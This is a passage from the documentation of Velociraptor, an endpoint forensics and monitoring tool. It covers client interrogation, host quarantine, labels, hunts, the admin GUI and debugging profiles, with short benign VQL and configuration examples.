   directory to an external system (e.g. Elastic or Splunk). Typically the VQL
   for such queries contains minimal filtering and the client acts mainly as an
   event forwarder for these event sources.

2. Selective and targeted queries. These artifacts contain refined detection and
   enrichment logic within the VQL query itself such that only high value events
   are actually forwarded. These more targeted queries send fewer rows, but each
   event is expected to have significant value, especially if it represents a
   detection.

In either case, the Velociraptor server does not do anything with the
events collected by default, other than write them to storage. If you want the
server to perform additional actions with the incoming events then you should
use [server side event queries]({{<ref "/docs/server_automation/server_monitoring/" >}}).

---END OF FILE---

======
FILE: /content/docs/clients/interrogation/_index.md
======
---
title: "Client Interrogation"
menutitle: "Interrogation"
date: 2024-12-29
draft: false
weight: 20
last_reviewed: 2024-12-29
---

Interrogation is the term we use to describe the process of querying a host for
it's basic host information.

When a new client enrolls the server automatically schedules a collection of the
`Generic.Client.Info` artifact on the client. This is a built-in artifact that
caters for all OSes but also performs some OS-specific queries on Linux and
Windows.

![initial interrogation flow](interrogation_initial.svg)

Some of the information collected by this artifact is added to the client info
database and specific fields are also indexed so that we can perform
[fast searches for clients]({{< ref "/docs/clients/searching/" >}}).

## Client information updates

In old versions of Velociraptor this information was not kept up to date unless
users explicitly created periodic hunts for `Generic.Client.Info`
(see [Server.Monitoring.ScheduleHunt]({{< ref "/artifact_references/pages/server.monitoring.schedulehunt/" >}}) for an example).
However this information is now recollected automatically on a recurring basis
in the background.

Of course if you want to be sure you have the absolute latest info you can still
manually collect the artifact or schedule it through a hunt, but you may prefer
to just change the frequency at which the data is collected, as explained below.

If you wish to change the update frequency this can be done via the config
setting `Client.client_info_update_time`. The update is initiated by the client
which sends a `Server.Internal.ClientInfo` message to the server upon startup
and then at a defined interval. Note that this is a client setting and therefore
cannot be centrally configured from the server. By default, if this setting is
not specified in the client config, then the client info is updated once per day
(every 86400 seconds). This is usually sufficient for most deployments since the
client info generally doesn't change very often. If you need more frequent
updates you should still avoid configuring it to occur too frequently as this
imposes additional load on the server.


## Custom artifact override

While the `Generic.Client.Info` artifact covers the basic information that most
people need, you may have a specific requirement to collect additional data as
part of the client interrogation flow. You cannot edit the `Generic.Client.Info`
artifact since it is a built-in artifact, however Velociraptor allows you to
override it with a customized version of the artifact. The way this works is
that if a client artifact exists with the name `Custom.Generic.Client.Info` then
interrogation flows will use that custom version instead of the built-in
artifact.

As explained in the artifact description for `Generic.Client.Info`, you can add
additional artifact sources containing your custom queries. However, the
existing sources, particularly the `BasicInformation` source, should not be
changed as the server expects fields from these sources to be present in all
interrogation flows. There are no constraints on what your custom sources can
contain.

Background client info updates support custom artifact override.


---END OF FILE---

======
FILE: /content/docs/clients/quarantine/_index.md
======
---
title: "Host Quarantine"
menutitle: "Quarantine"
date: 2024-12-24
draft: false
weight: 50
last_reviewed: 2024-12-30
---
For Windows and Linux clients you can quarantine the host using the
**Quarantine Host** (<i class="fas fa-briefcase-medical"></i>) button.
Quarantining a host will reconfigure the hosts's network stack to only allow it
to communicate with the Velociraptor server. This allows you to continue
investigating the host remotely while preventing the host from making other
network connections.

![Quarantine Host](quarantine.svg)

When quarantining a host you can send a pop-up message to the logged on users.

![Send message](quarantine_message1.png)

![Message pop-up](quarantine_message2.png)

{{% notice warning "Quarantine dependencies" %}}

Velociraptor's quarantine artifacts rely on the operating system to perform the
quarantine action. If dependencies are not met (for example nftables is a
required dependency on Linux) or if the system is corrupted or severely
compromised, or for many other reasons, the quarantine action may not work.

We provide no guarantees or assurances for this functionality. You should
always check for issues in the logs and outputs for quarantine artifacts.

{{% /notice %}}

The quarantine action is implemented by the following artifacts:

- [Windows.Remediation.Quarantine]({{< ref "/artifact_references/pages/windows.remediation.quarantine/" >}})
- [Linux.Remediation.Quarantine]({{< ref "/artifact_references/pages/linux.remediation.quarantine/" >}})

There is currently no quarantine artifact or capability for macOS.

On Windows and Linux the quarantine mechanism is specific to the OS but the
overall principles of operation are the same. For more details please see the
artifact descriptions included in each of the above artifacts.

A quarantined client will gain the label `Quarantine` so you can easily search
for all quarantined hosts using the
[label search]({{< ref "/docs/clients/searching/#search-syntax" >}}) feature.

## Windows-specific quarantine aspects

For Windows clients the quarantine process is label-driven.

A default client event monitoring query (implemented by the artifact
[Windows.Remediation.QuarantineMonitor]({{< ref "/artifact_references/pages/windows.remediation.quarantinemonitor/" >}}))
checks for the presence of the `Quarantine` label on Windows clients. If the
label is present then it runs the
[Windows.Remediation.Quarantine]({{< ref "/artifact_references/pages/windows.remediation.quarantine/" >}})
artifact which applies the quarantine (IPSec policy-based network isolation).

The quarantine action is periodically reapplied which means it remains in
effect across reboots.

Removing the `Quarantine` label from a Windows host will cause the artifact
`Windows.Remediation.Quarantine` to be run again, but this time with it's
parameter `RemovePolicy` set which will unquarantine the host.

---END OF FILE---

======
FILE: /content/docs/clients/labels/_index.md
======
---
title: "Client Labels"
menutitle: "Labels"
date: 2024-12-18
draft: false
weight: 30
last_reviewed: 2024-12-30
---

Clients can have one or more **labels** attached to them. In some software
applications the same concept is called "tags" but we just happen to call them
labels. Labels are useful when we need to hunt or perform other operations on a
well-defined group of hosts. For example, we can restrict a hunt to one or more
labels to avoid collecting unnecessary data, or to target specific hosts, or to
avoid specific hosts.

Although labels are associated with clients, the clients themselves have no
knowledge of the labels that have been applied to them. That is, labels are a
purely a server-side construct that are used to organize clients. The VQL
functions to query and manipulate labels are only available in VQL queries
running on the server.

## Adding or removing labels manually

Manual manipulation of labels can be done in the GUI's client search screen.

To add labels, select the hosts in the GUI and then click the "add labels"
(<i class="fas fa-tags"></i>)
button.

![Adding labels](labels.svg)

![Removing labels](labels_remove.svg)

## Adding or removing labels via VQL

Although it is possible to manipulate labels manually in the GUI, it is usually
easier to use VQL queries to add or remove labels via the `label()` plugin,
especially when you need to apply label changes to many clients.

For example, let's say we wanted to label all machines with the local
user of `mike`. I would follow the following steps:

1. Launch a hunt to list all user accounts on all endpoints using the
`Windows.Sys.Users`.
2. When enough results are returned, I click the `Notebook` tab in the
   hunt manager to access the hunt's notebook.
3. Applying the query below I filter all results with the user `Mike`
   and apply the label function to that host.

Note that `HuntId` is automatically set to the hunt id inside the hunt notebook:

```vql
SELECT Name, label(client_id=ClientId,
                   labels="Mikes Box",
                   op="set")
FROM hunt_results(hunt_id=HuntId,
                  artifact="Windows.Sys.Users")
WHERE Name =~ "mike"
```

{{% notice tip "Using labels to control hunts and monitoring" %}}

Labels applied to clients essentially form groups. Many features in
Velociraptor apply to these groups and it is possible to move clients
in and out of these during the course of an investigation.

For example, client event monitoring queries are controlled via client
labels. This allows you to assign a detection rule to a group of
machines then simple add or remove machines from the group.  Similarly
it is possible to restrict a hunt to a label group then simply add
clients to the label group in order to automatically add them to the
hunt.

For a practical example of using labels with client monitoring, please see the
artifact
[Windows.Remediation.QuarantineMonitor]({{< ref "/artifact_references/pages/windows.remediation.quarantinemonitor/" >}})
which is used to enforce network quarantine based on the `quarantine` label.

In addition, it's possible to create
[server monitoring]({{< ref "/docs/server_automation/server_monitoring/" >}})
artifacts which automatically add or remove labels based on flow completion
status and results. Thus we can implement event-driven label manipulation via
VQL which in turn initiates further actions (such as assigning the client to a
particular hunt based on a previous hunt's results). In this way we can
accomplish very powerful multi-phased automation that is directed by labeling.

{{% /notice %}}


### Built-in Labels

Sometimes you may want clients to have certain labels immediately from the time
of deployment, for example you might want to label clients as belonging to a
particular Active Directory Organizational Unit (OU) where the client was
deployed via a specific Group Policy.

Labels can be pre-assigned to clients via the client config.

Supposing we have a particular OU called `Sales`. We want to ensure that
Velociraptor clients in the Sales team are specifically marked with the `Sales`
label.

To achieve this we edit the client's configuration and specify that the `Sales`
label applies to this client.

```yaml
Client:
  labels:
  - Sales
```

With this added to the config, when the client enrolls it will tell the server
to apply the `Sales` label to it.

We then
[repackage the client MSI]({{< ref "/docs/deployment/clients/#repacking-the-official-release-msi" >}})
so that it contains this modified config and then deploy it via Group Policy
only on the Sales OU. This will result in those clients being enrolled with the
`Sales` label automatically.


{{% notice note %}}

Although any labels can be deleted on the server, the labels specified in the
client config file will return after the client restarts.

You can also change the labels in the client config at any time and any new
labels will be applied when the client restarts.

{{% /notice %}}

---END OF FILE---

======
FILE: /content/docs/hunting/_index.md
======
---
title: "Hunting"
date: 2021-06-09T04:13:25Z
draft: false
weight: 40
aliases:
  - "/docs/gui/hunting/"
---

With Velociraptor, you can collect the same artifact from multiple
endpoints at the same time using a **Hunt**. Hunts allow you to do the
following:

* Monitor offline endpoints by scheduling hunts collecting artifacts
  from any endpoints that come back online during a certain period.

* Examine the results from all collections easily.

* Keep track of which endpoints collected the artifact and make sure
  the same artifact is not collected more than once on any endpoint.

## What is a hunt?

A hunt is a logical collection of a one or more artifacts from a group
of systems. The **Hunt Manager** is a Velociraptor component that is
responsible for scheduling collections of clients that met certain
criteria, then keep track of these collections inside the hunt.

The important takeaway from this is that artifacts are still collected
from endpoints the same way as we did previously, it is simply
automated using the hunt manager.

## Schedule a new hunt

To schedule a new hunt, select the **Hunt Manager** <i class="fas
fa-crosshairs"></i> from the sidebar and then select **New Hunt** button
<i class="fas fa-plus"></i> to see the **New Hunt Wizard**.

Provide the hunt with a description and set the expiration date. You
can also target machines containing the same label (A **Label Group**),
or exclude the hunt from these machines.

![New Hunt](image89.png)

{{% notice note "Hunts and expiry" %}}

Hunts do not complete - they expire! The total number of clients in
any real network is not known in advance because new clients can
appear at any time as hosts get provisioned, return from vacation, or
get switched on. Therefore it does not make sense to think of a hunt
as done. As new clients are discovered, the hunt is applied to them.

It is only when the hunt expires that new clients no longer receive
the hunt. Note that each client can only receive the hunt once.

{{% /notice %}}


Next you need to select and configure the artifacts as before. Once
everything is set, click **Launch Hunt** to create a new hunt.

Hunts are always created in the `Paused` state so you will need to
click the **Start** button before they commence. Once
a hunt is started many hundreds of machines will begin collecting that
artifact, be sure to test artifact on one or two endpoints
first.

![Start Hunt](image90.png)

You can monitor the hunt's progress. As clients are scheduled
they will begin their collection. After a while the results are sent
back and the clients complete.

![Monitoring hunt progress](image92.png)

## Post-process a hunt

After collecting an artifact from many hosts in a hunt, we often need
to post-process the results to identify the results that are
important.

Velociraptor creates a notebook for each hunt where you can apply a
VQL query to the results.

Let's consider our earlier example collecting the scheduled tasks from
all endpoints. Suppose we wanted to only see those machines with a scheduled task that runs a batch script from cmd.exe and count
only unique occurrences of this command.

We can update the notebook's VQL with a `WHERE` clause and `GROUP BY`
to post-process the results.

![Post Processing](image95.png)


{{% notice warning "Managing hunt data volumes" %}}

When hunting large numbers of endpoints, data grows quickly. Even
uploading a moderately sized file can add up very quickly. For example,
collecting a 100Mb file from 10,000 machines results in over 1Tb of
required storage.

Be mindful of how much data you will be uploading in total. It is
always best to use more targeted artifacts that return a few rows per
endpoint rather than fetch raw files that need to be parsed offline.

{{% /notice %}}

## Hunts and labels

We have seen above that we can target hunts by labels. When a hunt is
targeted to a label, only hosts that have the label assigned will be
automatically scheduled by the hunt manager.

This allows you to dynamically apply the hunt to various hosts by
simply adding labels to them. This workflow is very powerful as it
allows for incremental triaging.

Lets consider an example for how this can be applied in practice.

![Schedule hunt by label](incremental_hunting_by_label_1.png)

I start the process by setting up a hunt for preserving the event logs
from clients which I consider to have been compromised. Since this
hunt will collect a lot of data, I can not really run it across the
entire network - instead I will be very selective and only schedule it
on compromised hosts.

1. I add a description for this hunt
2. Next I select to Match by Label.
3. I can search for an existing label, or if no label already exists,
   I can create a new label. In this case I will choose the new label
   `Preserve` to denote a host I want to preserve.

For this example, I choose the `Windows.KapeFiles.Targets` artifact
with the `Eventlogs` target to collect all windows event logs for
preservation.

![Collect for preservation](incremental_hunting_by_label_2.png)

The hunt is started but since there are no clients with the new label
yet, no clients are scheduled.

![Waiting for clients](incremental_hunting_by_label_3.png)

I carry on with my investigation, and at some point I find a client
which I believe is compromised! I simply go to the host overview page
and label this client.

![Labeling clients](incremental_hunting_by_label_4.png)

The act of labeling the client has automatically scheduled the client
into the hunt.

![Client is scheduled](incremental_hunting_by_label_5.png)

Note that I can use this technique to automatically schedule clients
into various hunts using the VQL
[label()]({{< ref "/vql_reference/server/label/" >}}) function. Therefore I can use
this technique to automatically add clients to various hunts based on
previous findings.

## Manually adding clients to hunts

You can think of hunts as a group of collections that we can inspect
together. For example we can see all the processes from all clients by
collecting the `Windows.System.Pslist` artifact across the entire
network in a hunt. Then we can filter across all the processes with
VQL:

```vql
SELECT * FROM hunt_results(hunt_id="H.123", artifact="Windows.System.Pslist")
```

This is very convenient - hunts are really a way to group related
collections together.

Normally the **Hunt Manager** component described above is responsible
for scheduling collections on clients depending on certain conditions
(e.g. labels or OS matches), and adding them to the hunt. However the
scheduling step is a different separate step from adding the
collection to the hunt.

It is possible to schedule the collection manually and ***then*** also
add the collection to the hunt. This method gives the ultimate
flexibility in managing hunt membership.

A common example is when a collection needs to be redone for some
reason. Normally the hunt manager ensures only a single collection
from the hunt is scheduled on the same client. However sometimes the
collection fails, or simply needs to be recollected for fresher
data to be added to the hunt.

In the above example, I redo the collection of
`Windows.KapeFiles.Targets` that the hunt scheduled previously by
navigating to the collection view in that specific client. Then I
**Copy** the collection by pressing the <i class="fas fa-copy"></i>
button. I can now update things like, timeout or change the parameters
a bit as required.

![Manually rescheduling a collection](manual_hunt_1.png)

Next, I add the collection to the hunt by clicking the **Add to Hunt** <i class="fas
fa-crosshairs"></i> button.

![Add collection to hunt](manual_hunt_2.png)

The new collection is added to the hunt. It is up to you if you want
to keep the old collection around or just delete it.

![Hunt with additional collection](manual_hunt_3.png)

You can add collections to a hunt using the
[hunt_add()]({{< ref "/vql_reference/server/hunt_add/" >}}) VQL function which
allows unlimited automation around which flows are added to hunt (and
can also automate the relaunching of the collections).

To help you with manipulating hunts with the notebook, hunt notebooks
offer a **Cell Suggestion** to assist with managing the hunt progress.

![Adding a Hunt Progress cell suggestion](hunt_suggestion_1.png)


![Helpful VQL queries](hunt_suggestion_2.png)

---END OF FILE---

======
FILE: /content/docs/gui/_index.md
======
---
title: "The Admin GUI"
weight: 15
---

The Admin GUI is a web application that can be used to interact and
manage Velociraptor. The GUI allows users to schedule new collections,
edit existing artifacts or write new ones and launch hunts.

## The Welcome screen

The Velociraptor landing page offers some links to commonly used tasks
within the application.

![The Velociraptor Welcome Screen](welcome_screen.png)

{{% notice tip %}}
You can customize the Welcome screen by editing the `Server.Internal.Welcome` artifact.
{{% /notice %}}

### Inspecting Server state

Of interest is the link to `Inspecting Server state`. This allows
administrators to set server metadata such as secrets to interact with
other systems. Placing secrets in a centralized location allows
artifacts to use them without exposing them to non-administrator users
on the server.

![The Server Metadata editor](server_metadata.png?classes=shadow&width=80pc)

## User Preferences

The User can customize their interface by clicking on the user tile at
the top right of the screen. There are a number of aspects of the GUI
application that can be adjusted.

![Adjusting user preferences](user_preferences.png)

* `Org selector`: The Org selector allows a user to switch to a
  different org. See the [Organizations]({{% ref
  "/docs/deployment/orgs/" %}}) section for more information on
  multi-tenancy in Velociraptor.

* `Password`: If the deployment uses `Basic` authentication mode, this
  allows the user to change their own password. See [Basic Authentication]({{% ref "/docs/deployment/security/#basic-authentication" %}}).

* `Theme`: Velociraptor offers a number of themes including several
  dark mode themes, light mode themes and some fun themes too. Find
  the look that fits you best!

* `Downloads Password`: In a number of places in the interface,
  Velociraptor offers the user the opportunity to download collected
  data. However, in many cases this data might contain malware or
  other unwanted software that typically triggers Antivirus or other
  security software. This setting allows you to define a password to
  encrypt the zip files with to avoid triggering such software.

* `Language`: Velociraptor's interface can be switched to a number of
  languages. If your favorite language is not there, consider
  contributing a translation file!

* `Display Timezone`: The GUI shows many timestamps throughout. Times
  are always shown in RFC-3339 / ISO-8601 which makes then unambiguous
  in all timezones. This setting switches the display to show all
  times in a particular timezone. This helps visual inspection but
  does not change the times in any way (just changes their
  representation). Internally all times are always serialized in UTC.


## The Dashboard

The Dashboard can be accessed from the Home icon on the sidebar. The
dashboard shows the current state of the deployment at a high level.

![The Server Dashboard](dashboard.png?classes=shadow&width=80pc)

The dashboard is divided into two parts. On the left, the total memory
and CPU used by all frontends is down over the past day. On the right,
the total number of currently connected clients is shown.

{{% notice tip %}}

You can customize the Server Dashboard screen by editing the
`Server.Monitor.Health` artifact. The artifact specifies a template
containing markdown and using the Golang Template Language. You can
also run arbitrary VQL in dashboards!

{{% /notice %}}

### Table GUI Widgets

A common UI element in the Velociraptor GUI is the table widget. Since
Velociraptor deals with VQL queries and all queries simply return a
list of rows, the GUI presents a lot of results in a table form.

All Velociraptor tables have some common tools available as can be
seen above:

1. The Column Selector - allows users to show/hide columns. This is
   useful when there are many columns and the table takes up a lot of
   horizontal real estate, or when some columns provide too much
   details

2. View Raw JSON - All VQL queries simply return a result set encoded
   as a list of JSON objects. For more complex tables it is sometimes
   easier to see the precise JSON returned, and clicking on this
   button displays the raw json in a dialog box.

![Raw JSON](image59.png)

3. Export table as CSV or JSON - Clicking on the export table button
   simply exports the **visible** columns as a CSV file. This is a
   great way of filtering out uninteresting columns and producing more
   targeted CSV files for post processing in e.g. Excel.


---END OF FILE---

======
FILE: /content/docs/gui/debugging/_index.md
======
---
title: "Debugging"
description: "Debugging"
---

Like any piece of software, Velociraptor makes a number of engineering
tradeoffs, and may encounter some error conditions or event bugs. When
faced with the prospect of an unresponsive server or client, or high
CPU load, users often ask *"What is Velociraptor doing right now?"*

## Profiles

Without appropriate ways to ask Velociraptor what is happening
internally, one would need to attach a debugger to understand what is
happening. To help users see into the black box of Velociraptor, we
have implemented extensive `Debugging Profiles` which allow us to
inspect the state of the various sub-systems inside the program.

Making Velociraptor's inner workings transparent helps to explain to
users how it actually works, what tradeoffs are made and why the
program is may not be behaving as expected.

`Profiles` are views into specific aspect of the code. You can collect
profiles from the local server using the `Server.Monitor.Profile`
artifact or from remote clients using `Generic.Client.Profile`.

Collecting these artifacts gives a snapshot or a dump of all profiles
in an instant in time.

![Collecting server profiles](server_profiles.svg)

{{% notice note "Seeking assistance from the community" %}}

If you encounter an issue that requires more thorough inspection, you
can seek assistance from the community on Discord or the mailing
list. In this case, you will probably be asked to attach a profile to
your request. This helps the developers to understand issues within
the system.

Simply collect the relevant artifact (either from the server or a
client) and export the collection into a zip file. You can then send
us the Zip file for analysis.

{{% /notice %}}


### The Debug Server

While collecting profiles using an artifact is useful to take a
snapshot of the current process status, it is not very convenient when
we want to see how the process evolved over time.

To help with this, Velociraptor has a `Debug server` GUI that assists
in accessing a live view of debugging profiles.

On the server, you can access the debug server from the main welcome
page.

![Accessing the debug server on the server](debug_server_gui.svg)

Which links to a main page leading to specific profiles.

![The debug server main page](debug_server_main_page.svg)

The client by default does not export the debug server for security
reasons. When debugging a client issue you can start the debug server
by adding the `--debug` flag (You may need to stop the service first
with `sc.exe stop velociraptor`):

```
velociraptor.exe --config "C:/Program Files/Velociraptor/client.config.yaml" -v --debug client
```

This will cause the debug server to be served over the localhost
interface (by default `http://localhost:6060/` )


The below pages provide specific details on each profile type. It is
instructive to read about each profile item to understand how
Velociraptor works internally, the tradeoffs made and how to get the
best of Velociraptor in the real world.


{{% children description=true %}}

---END OF FILE---

======
FILE: /content/docs/gui/debugging/client/_index.md
======
---
title: "Client"
description: "Profiles present on the client"
weight: 20
---

These profiles only exist on the client. You can see those in the
debug server by adding the `--debug` flag (you can also add the
`--debug_port` flag to set a different port). The client will by
default serve the debug server over `http://localhost:6060/`.

{{% children description=true depth=1 %}}

---END OF FILE---

======
FILE: /content/docs/gui/debugging/client/client_monitoring/_index.md
======
---
title: "Monitoring"
weight: 10
description:  Report stats on client monitoring artifacts
---


The client monitoring profile shows current information on the client
event monitoring subsystem.

Clients receive a `Client Event Table` update from the server,
instructing them on a set of `CLIENT_EVENT` artifacts to run. The
results from these artifacts are streamed back to the server over
time.

Client event queries are stored in the client's `writeback file` so
they can start immediately as soon as the client boots, even if it is
not connected to the server or offline. While offline the results are
buffered locally to a file, and then synced with the server at the
next opportunity.

![Client Monitoring Profile](profile.png)

The above example shows a typical output from the client monitoring
profile. We usually consider the following aspects:

1. Which client monitoring queries are actually running on the client?
2. How much data do these transfer to the server.


While it is easy to add a lot of client monitoring queries and to
forward a large number of events to the server, these do not come for
free!

Additional monitoring means additional CPU use on the end
point. Similarly forwarding more events means more network traffic and
additional storage requirements on the server.

You can examine the client monitoring queries assigned from the server.

![Client Monitoring Configuration](client_monitoring_configuration.svg)


The above example shows some poorly thought out queries as an example:


#### Example `Windows.Sysinternals.SysmonLogForward`

We see that this client is collecting the
`Windows.Sysinternals.SysmonLogForward` artifact. This artifact simply
forwards events from `Sysmon` to the server. Depending on how well the
Sysmon service is configured this can result in a lot of events. In
this case 1500 events in 2 hours resulted in forwarding about 700kb.

Is that too much? Really depends how much value you get out of these
events. It is easy to now estimate the total storage required
(e.g. 0.7Mb in 2 hours would be about 8.5mb per day, times 10,000
endpoints will require about 85gb per day). Do you have a way to
process this data? What do you do with this data? Is it useful?

You will have to make a call if the value gained is worth the storage
and network costs in your specific deployment.

#### Example `Windows.Hayabusa.Monitoring`

We see also in this example that we are collecting the
`Windows.Hayabusa.Monitoring` artifact. This artifact applies a set of
Sigma rules to the event logs to surface high valued events only.

In principle, this approach should reduce the total number of events
sent to the server, since only high level events are forwarded (those
that match the detection rules).

However in this case, the Sigma rules selected are of `Critical, High
and Medium` severity. Many of these rules have low fidelity and so end
up firing on more events than necessary (there are many false
positives!).

We can see the effect of this choice from the profile - the artifact
forwarded 450 rows totaling about 0.7mb in 2 hours. These are too
many to be considered useful for detection. A better tuned set of
rules will be more effective and transfer less data.


#### Example `Windows.Detection.Honeyfiles`

The final example is the `Windows.Detection.Honeyfiles` artifact that
places a number of juicy sounding files on the system (e.g. AWS keys,
SSH keys etc). The artifact then uses ETW to monitor any access to
these files and sends events for each file accessed. If an attacker is
simply looking for useful files to compromise they might copy or read
those files which will trip the detection.

This is an example of an effective client monitoring rule. When this
artifact sends an event, it is extremely high valued (presuming the
user of this system does not normally interact with the honey
files).

In this example, we see that this artifact did not send any events at
all and so has no storage or network overheads! When an event is
finally sent to the server it would probably require further
investigation!

---END OF FILE---

======
FILE: /content/docs/gui/debugging/client/client_flows/_index.md
======
---
title: "Flows"
description:  Report the state of the client's flow manager
weight: 50
---

The Client Flows profile shows information about currently executing
collections on the endpoint. It is most interesting to collect when
another flow is executing on the endpoint.

![Client Flow Profile](profile.png)

The profile shows the progress of the collection on the endpoint:

1. The flow id is used to identify the flow.
2. The duration of the collection since it was last started
3. How many bytes were uploaded to the server?
4. How many rows were returned to the server?


These are generally the same stats the server keeps but are from the
point of view of the client.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/vql/_index.md
======
---
title: "VQL"
weight: 50
description: Track state of various VQL plugins
---

Much of Velociraptor functionality is implemented using VQL
plugins. Some plugins are very sophisticated and require their own
profile tracking.

{{% children description=true depth=1 %}}

---END OF FILE---

======
FILE: /content/docs/gui/debugging/vql/queries/_index.md
======
---
title: "Queries"
description:  Report Currently Active queries.
weight: 10
---

To understand what queries are currently running, we can view the
`Active Queries` profile. This shows us what queries are currently
running in the process.

![Active Queries profile](profile.png)

The above example shows a number of queries watching a variety of
event logs on the endpoint. This is because this endpoint is running
the `Windows.Hayabusa.Monitoring` artifact, which evaluate many Sigma
rules, many referring to different log sources. Each log source relies
on parsing the event logs.

The `Recent Queries` profile similarly shows all recent queries (even
after they completed). This helps us understand what queries had run
on the endpoint previously, and how long they took to complete.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/vql/plugins/_index.md
======
---
title: "Plugins"
description:  See currently running VQL plugins
weight: 20
---

At their core VQL queries process rows emitted from VQL plugins. We
have seen previously the Active Queries tracker which provides
information on currently running queries.

However it is also useful to know what plugins are currently running
and what parameters are used within them. This gives us a really good
idea what the VQL engine is doing exactly at the moment.

![Plugin tracker profile](profile.png)

The above example show the plugins currently active. We see a few
instances of `watch_monitoring()`. Another instance of `watch_etw()`
plugin is seen watching the Sysmon ETW stream. Finally we see some
instances of `watch_evtx()` watching various event logs.

Note that while the query view shows what queries are running, this
view shows the specific plugins running with the values provided to
them. The query view usually shows variable names being passed to the
plugins, but this view shows the content of the variables.

Sometimes a query runs very slowly and we dont really know why. Using
the plugins profile helps us understand what operations are currently
running. For example, a common reason for slow down is when an
artifact accesses files on a network share or fuse share because those
types of access involve network transfers which may be very slow.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/vql/plugins/windows_event/_index.md
======
---
title: "Evtx"
weight: 40
---

The Windows Event Logs contain windows events from various
sources. Velociraptor implements a parser to dump out all events from
a Windows event log file, but the `watch_evtx()` plugin can be used to
follow the log file as events are written to it.

This allows Velociraptor to analyze events in near real time, as they
are flushed into the log file. For example, the
`Windows.Hayabusa.Monitoring` artifact uses this functionality to
apply sigma rules on events in near real time.

How does Velociraptor follow the event log? The algorithm requires
Velociraptor to periodically check the last message in the file, then
parse the message between the last parsed message until the latest event.

![Windows Event Log profile](profile.png)

This process is illustrated by inspecting the `Windows Event Log
Tracker`. The example above shows that Velociraptor is currently
watching 32 different event log files.

Each file is scanned periodically (by default every 60 seconds). We
can see the last scan time of the file, and when we plan to scan the
file again. Important to note that the scan time is somewhat
randomized to avoid Velociraptor processing all files at the same time
(This is called the [Thundering Herd Problem](https://en.wikipedia.org/wiki/Thundering_herd_problem#) ).

The two major operations are `Find Last Event` which scans the event
log file to find the last event, and `Monitor Once` which parses all
the events since the last checkpoint and emits those into the output
of the plugin (Note that this time may be increased due to delays
introduced by the plugin consumer).

Note that `watch_evtx()` is fairly cheap to run as the work of
scanning and parsing the event log file may be amortized across longer
times. For example, even if the event log contains millions of events,
we only parse the last written events which were written in the last
minute. The total CPU load is amortized over the frequency of
checking - scanning the file less frequently will result in less
average CPU utilization. It is also suitable to restrict CPU limits
for `watch_evtx()` based queries. If the plugin is paused due to
average CPU limits being above the limit, the plugin will just catch
up at a later time when the CPU load is lower.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/vql/plugins/etw/_index.md
======
---
title: "ETW"
weight: 10
---

Event Tracing For Windows (ETW) is a powerful source of system
information available on Windows. Velociraptor allows subscribing to
the ETW streams using the `watch_etw()` plugin.

![ETW profile](profile.png)

The ETW profile helps us understand what ETW streams Velociraptor is
subscribed to. When a VQL query calls `watch_etw()`, it subscribes to
an internal ETW session manager service. Rather than creating an ETW
session for each specific invocation of `watch_etw()`, Velociraptor
multiplexes watchers onto the same internal ETW stream.

This means that multiple `watch_etw()` calls to the same ETW provider
do not cost any more than a single watcher. Each event is passed to
all watchers in turn.

This can be seen in the profile example above: The `NT Kernel Logger`
has a single watcher, but the `Microsoft-Windows-Sysmon/Operational`
stream has 3 different watchers (i.e. 3 different queries are
processing the same ETW stream).

Some ETW streams require further internal processing. For example, the
`NT Kernel Logger` stream requires Velociraptor to keep track of
various objects across events, use rundown streams and other methods
to actually make the ETW stream useful for consumers. Velociraptor
uses this processing to enrich the ETW events with important
information, such as full file paths, full registry keys or enriching
backtrace information with function names.

These post processing stats are also shown in the tracker as well. We
can see that the current consumer is interested in file events
(`options: File`), and that requires us to post process the ETW file
events by using a cache.

Another important metric to look at is the total number of ETW events
processed. The `NT Kernel Logger` returned about 2 million events vs
the Sysmon provider's 2500 events. Using an ETW provider emitting many
events will increase CPU requirements. You may be able to tune the ETW
provider using the any/all keyword parameter. However some ETW
providers produce too many events to be practical to use for
detection.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/vql/plugins/glob/_index.md
======
---
title: "Glob"
weight: 20
---

Velociraptor is often used to search for files. This is commonly done
using the `glob()` plugin. This plugin is highly optimized to speed up
searching through various filesystems.

However, sometimes it is hard to know what the plugin is doing. For
example a query such as:

```sql
SELECT * FROM glob(globs='C:/**/*.foobar')
```

Will search for a file with a `foobar` extension. However, what if no
such file exists on the disk at all? In that case, although the
`glob()` plugin will enumerate every file on the disk, no results will
be returned and the query will appear to be blocked.

If you want to see what the glob plugin is doing, use the `Glob
Profile`:

![Glob profile](profile.png)

The glob profiles shows the last 10 directories the plugin inspected,
and the count of files within these directories.

A common reason for glob operations to slow down is when the plugin
accesses files on a network share or recurses through many symbolic
links (for example on Linux, if the `/proc/` filesystem is not
properly excluded, the plugin may enter a symlink cycle). Viewing the
most recent directories accessed by glob will reveal such issues.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/vql/plugins/sqlite/_index.md
======
---
title: "Sqlite"
weight: 70
---

SQLite files are used widely to store data in a structured file. We
parse SQLite files using the Golang SQLite library.

Usually SQLite files implement file locking to coordinate multiple
processes accessing the same file. This poses a problem for
Velociraptor, which needs to read files currently opened by other
applications (e.g. a currently running browser).

When Velociraptor attempts to open the SQLite file with the library,
the open may fail if the file is locked. Similarly if Velociraptor
opens a file which is in use by another application, the other
application may fail to open it. Additionally, due to locking
semantics access to the SQLite file while another application is
trying to use it may be slow as rows and tables are locked and
unlocked.

To avoid these complications, by default Velociraptor makes a copy of
the SQLite file and opens that copy file. This ensures we have
exclusive access to the file, even if it is currently in use and
locked. In practice this turns out to be a lot faster than using the
original file, more than compensates for the overheads of making the
initial copy.

Since making a temporary copy is a slightly expensive operation we try
to cache the file for a duration, so that if the same file is opened
again, we can access our temporary copy immediately.

This algorithm can be seen in the `SQLite tracker`

![SQLite profile](profile.png)

---END OF FILE---

======
FILE: /content/docs/gui/debugging/vql/plugins/sigma/_index.md
======
---
title: "Sigma"
weight: 40
---

Velociraptor has a built in Sigma rule evaluator, implemented with the
`sigma()` plugin. Sigma is an open standard for writing detection rules, with the [Velociraptor implementation described here]({{< ref "/blog/2023/2023-11-15-sigma_in_velociraptor/" >}})

Sigma rules rely on a `log source`, which in Velociraptor is a VQL
query. The rules also define detection clauses which apply on the
events emitted from the log source.

When a Sigma artifact is collected, the rules are loaded into the
sigma evaluator, and all log sources referred to by the rules are
started.

If multiple rules use the same log source, the Sigma plugin evaluates
